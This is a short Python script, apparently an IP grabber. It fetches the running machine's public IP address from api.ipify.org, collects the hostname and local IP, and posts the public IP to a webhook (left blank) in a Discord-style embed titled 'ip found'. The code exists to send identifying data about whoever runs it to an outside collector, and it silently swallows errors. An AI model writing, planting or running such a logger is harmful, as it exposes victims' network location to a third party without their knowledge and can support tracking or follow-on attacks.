# Import all the needed packages 
import socket
from requests import get
import requests
import os 
# Make the variables
ip = get('https://api.ipify.org').text
webhookURL = ''
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 
# Build the structure  of  the message 
data = {
    'username': 'ip',
    'embeds': [{
        'title': 'ip found',
        'description': "ip " + ': ' + ip,
    }]
}
# Send it 
result = requests.post(webhookURL, json = data)

try:
    result.raise_for_status()
except:
    pass